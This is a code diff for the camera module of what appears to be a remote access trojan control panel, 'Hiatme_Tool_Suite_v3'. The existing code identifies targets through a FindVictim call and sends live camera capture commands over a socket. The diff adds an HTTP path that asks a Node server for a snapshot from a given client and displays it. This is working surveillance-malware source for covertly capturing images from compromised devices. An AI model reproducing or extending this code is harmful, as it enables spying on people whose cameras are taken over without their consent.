@@ -1,27 +1,54 @@
-﻿using System;
+using System;
 using System.Drawing;
+using System.IO;
+using System.Net.Http;
 using System.Net.Sockets;
+using System.Threading.Tasks;
 using System.Windows.Forms;
+using Newtonsoft.Json.Linq;
 
 namespace Hiatme_Tool_Suite_v3
 {
     public partial class Kamera : Form
     {
         Socket soketimiz;
+        private readonly string _apiClientId;
+        private readonly string _displayName;
         public string ID = "";
         public int max = 0;
         public int zoom = 0;
+
         public Kamera(Socket s, string aydi)
         {
             soketimiz = s;
             ID = aydi;
+            _apiClientId = null;
+            _displayName = null;
             InitializeComponent();
             comboBox5.SelectedItem = "Rotate270FlipX";
             comboBox7.SelectedIndex = 3;
-
         }
-        private void button1_Click(object sender, EventArgs e)
+
+        /// <summary>Open camera view via Node server API (no socket).</summary>
+        public Kamera(string clientId, string displayName)
         {
+            soketimiz = null;
+            _apiClientId = clientId;
+            _displayName = displayName ?? clientId;
+            ID = clientId;
+            InitializeComponent();
+            Text = "Camera - " + _displayName;
+            comboBox5.SelectedItem = "Rotate270FlipX";
+            comboBox7.SelectedIndex = 3;
+        }
+
+        private async void button1_Click(object sender, EventArgs e)
+        {
+            if (soketimiz == null && !string.IsNullOrEmpty(_apiClientId))
+            {
+                await RequestCameraFromApiAsync();
+                return;
+            }
             if (!string.IsNullOrEmpty(comboBox6.SelectedItem.ToString()))
             {
                 label1.Visible = false;
@@ -46,7 +73,7 @@ namespace Hiatme_Tool_Suite_v3
                     Text = "Camera Manager - " + ((Form1)Application.OpenForms["Form1"]).FindVictim(soketimiz.Handle.ToString());
                     string cam = "";
                     string flashmode = "";
-                    string resolution = "";                   
+                    string resolution = "";
                     cam = comboBox6.SelectedItem.ToString().Replace("Front: ", "").Replace("Back: ", "");
                     button1.Enabled = false;
                     ((Control)tabPage2).Enabled = false;
@@ -56,13 +83,59 @@ namespace Hiatme_Tool_Suite_v3
                     label2.Text = "Capturing..";
                 }
                 catch (Exception) { }
-
             }
             else
             {
                 MessageBox.Show("Please select a camera", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                 return;
             }
+        }
+
+        private async Task RequestCameraFromApiAsync()
+        {
+            try
+            {
+                button1.Enabled = false;
+                label2.Text = "Capturing..";
+                var baseUrl = (MainValues.ServerApiBase ?? "http://localhost:3000").TrimEnd('/');
+                var payload = new JObject
+                {
+                    ["clientId"] = _apiClientId,
+                    ["mediaType"] = "camera"
+                };
+                var content = new StringContent(payload.ToString(), System.Text.Encoding.UTF8, "application/json");
+                var response = await Form1.ServerHttpClient.PostAsync(baseUrl + "/api/request-media", content);
+                if (!response.IsSuccessStatusCode)
+                {
+                    label2.Text = "Failed: " + response.StatusCode;
+                    button1.Enabled = true;
+                    return;
+                }
+                var json = await response.Content.ReadAsStringAsync();
+                var jo = JObject.Parse(json);
+                var data = jo["data"]?.ToString();
+                if (string.IsNullOrEmpty(data))
+                {
+                    var err = jo["error"]?.ToString();
+                    label2.Text = string.IsNullOrEmpty(err) ? "No image" : err;
+                    button1.Enabled = true;
+                    return;
+                }
+                var bytes = Convert.FromBase64String(data);
+                using (var ms = new MemoryStream(bytes))
+                {
+                    var img = Image.FromStream(ms);
+                    if (pictureBox1.Image != null)
+                        pictureBox1.Image.Dispose();
+                    pictureBox1.Image = (Image)img.Clone();
+                }
+                label2.Text = "Captured.";
+            }
+            catch (Exception ex)
+            {
+                label2.Text = "Error: " + ex.Message;
+            }
+            button1.Enabled = true;
         }
         public Image RotateImage(Image img)
         {
@@ -113,7 +186,7 @@ namespace Hiatme_Tool_Suite_v3
         public bool zoomSupport = false;
         private void button4_Click(object sender, EventArgs e)
         {
-
+            if (soketimiz == null) return;
             if (enabled == false)
             {
                 if (!string.IsNullOrEmpty(comboBox6.SelectedItem.ToString()))
@@ -151,6 +224,7 @@ namespace Hiatme_Tool_Suite_v3
 
         private void checkBox2_CheckedChanged(object sender, EventArgs e)
         {
+            if (soketimiz == null) return;
             if (button4.Text == "Stop")
             {
                 if (checkBox2.Checked)
@@ -166,6 +240,7 @@ namespace Hiatme_Tool_Suite_v3
 
         private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
         {
+            if (soketimiz == null) return;
             if (button4.Text == "Stop")
             {
                 if (!string.IsNullOrEmpty(comboBox3.SelectedItem.ToString()))
@@ -177,7 +252,7 @@ namespace Hiatme_Tool_Suite_v3
 
         private void button2_Click(object sender, EventArgs e)
         {
-
+            if (soketimiz == null) return;
             if (zoom < max)
             {
                 zoom += 1;
@@ -188,6 +263,7 @@ namespace Hiatme_Tool_Suite_v3
 
         private void button3_Click(object sender, EventArgs e)
         {
+            if (soketimiz == null) return;
             if (zoom > 0)
             {
                 zoom -= 1;
@@ -212,7 +288,8 @@ namespace Hiatme_Tool_Suite_v3
         }
         private void Kamera_FormClosing(object sender, FormClosingEventArgs e)
         {
-            Form1.CommandSend("LIVESTOP", "[VERI][0x09]", soketimiz);
+            if (soketimiz != null)
+                Form1.CommandSend("LIVESTOP", "[VERI][0x09]", soketimiz);
         }
 
         private void comboBox5_SelectedIndexChanged(object sender, EventArgs e)
@@ -276,6 +353,7 @@ namespace Hiatme_Tool_Suite_v3
 
         private void checkBox3_CheckedChanged(object sender, EventArgs e)
         {
+            if (soketimiz == null) return;
             if (button4.Text == "Stop")
             {
                 if (checkBox3.Checked)
